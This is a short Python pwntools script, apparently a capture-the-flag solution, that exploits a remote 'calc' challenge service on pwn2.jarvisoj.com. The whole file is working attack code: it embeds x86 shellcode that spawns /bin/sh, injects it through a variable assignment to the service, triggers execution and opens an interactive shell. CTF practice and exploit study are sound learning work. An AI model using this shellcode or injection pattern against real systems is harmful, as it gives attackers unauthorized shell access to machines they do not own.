#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *


shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

#p=process('./calc.exe')
p=remote('pwn2.jarvisoj.com', 9892)

p.sendline('var add = "'+shellcode+'"')
p.sendline('+')

p.interactive()
